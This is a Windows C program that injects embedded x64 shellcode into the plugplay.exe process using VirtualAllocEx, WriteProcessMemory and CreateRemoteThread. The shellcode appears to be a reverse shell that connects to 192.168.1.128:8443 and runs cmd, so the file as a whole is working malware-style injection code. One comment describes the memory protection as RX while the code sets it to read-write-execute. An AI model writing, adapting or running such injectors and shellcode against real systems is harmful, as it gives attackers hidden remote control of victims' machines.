#include <stdbool.h>
#include <stdio.h>
#include <windows.h>

#include "process_enum.h"

unsigned char g_payload[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
    "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
    "\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x01\x80"
    "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
    "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
    "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
    "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
    "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
    "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
    "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
    "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
    "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
    "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
    "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
    "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
    "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
    "\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
    "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
unsigned int g_payload_len = sizeof(g_payload);

int main(void)
{
    const wchar_t *p_process_name = L"plugplay.exe";
    HANDLE h_process = NULL;
    HANDLE h_remote_thread = NULL;
    LPVOID p_remote_buffer = NULL;
    DWORD cb_pid = 0;
    DWORD cb_old_protect = 0;
    bool b_success = false;

    //////////////////////////////////////////////////////////////////////////
    // 1. Resolve target PID by process name
    //////////////////////////////////////////////////////////////////////////
    cb_pid = ListProcesses(p_process_name);
    if (cb_pid == 0)
    {
        printf("[ERROR] Failed to obtain process ID!\n");
        return -1;
    }

    printf("[*] Running PI with target PID: %lu\n", cb_pid);

    //////////////////////////////////////////////////////////////////////////
    // 2. Open the target process
    //////////////////////////////////////////////////////////////////////////
    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cb_pid);
    if (h_process == NULL)
    {
        printf("[ERROR] Failed to acquire process handle!\n");
        return -1;
    }

    //////////////////////////////////////////////////////////////////////////
    // 3. Allocate RW memory in the target process
    //////////////////////////////////////////////////////////////////////////
    p_remote_buffer = VirtualAllocEx(h_process, NULL, g_payload_len,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (p_remote_buffer == NULL)
    {
        printf("[ERROR] Failed to allocate memory within the process (PID: %lu)! Error: %lu\n",
               cb_pid, GetLastError());
        goto cleanup;
    }

    printf("[*] Memory allocated at: %p\n", p_remote_buffer);

    //////////////////////////////////////////////////////////////////////////
    // 4. Write the payload into the target process
    //////////////////////////////////////////////////////////////////////////
    b_success = WriteProcessMemory(h_process, p_remote_buffer, g_payload,
                                   g_payload_len, NULL);
    if (b_success == false)
    {
        printf("[ERROR] Failed to write shellcode! Address: %p, Error: %lu\n",
               p_remote_buffer, GetLastError());
        goto cleanup;
    }

    //////////////////////////////////////////////////////////////////////////
    // 5. Flip memory protection to RX and start the thread
    //////////////////////////////////////////////////////////////////////////
    b_success = VirtualProtectEx(h_process, p_remote_buffer, g_payload_len,
                                 PAGE_EXECUTE_READWRITE, &cb_old_protect);
    if (b_success == false)
    {
        printf("[ERROR] Failed to update memory protection! Address: %p, Error: %lu\n",
               p_remote_buffer, GetLastError());
        goto cleanup;
    }

    h_remote_thread = CreateRemoteThread(
        h_process, NULL, 0, (LPTHREAD_START_ROUTINE)p_remote_buffer,
        NULL, 0, NULL);
    if (h_remote_thread == NULL)
    {
        printf("[ERROR] Failed to create thread within the process (PID: %lu)! Error: %lu\n",
               cb_pid, GetLastError());
        goto cleanup;
    }

    //////////////////////////////////////////////////////////////////////////
    // 6. Wait for completion
    //////////////////////////////////////////////////////////////////////////
    printf("[*] Waiting for the thread to return...\n");
    WaitForSingleObject(h_remote_thread, INFINITE);

    //////////////////////////////////////////////////////////////////////////
    // 7. Cleanup
    //////////////////////////////////////////////////////////////////////////
cleanup:
    if (h_remote_thread != NULL)
        CloseHandle(h_remote_thread);

    if (p_remote_buffer != NULL)
        VirtualFreeEx(h_process, p_remote_buffer, 0, MEM_RELEASE);

    if (h_process != NULL)
        CloseHandle(h_process);

    printf("[*] Process injection complete.\n");
    return 0;
}
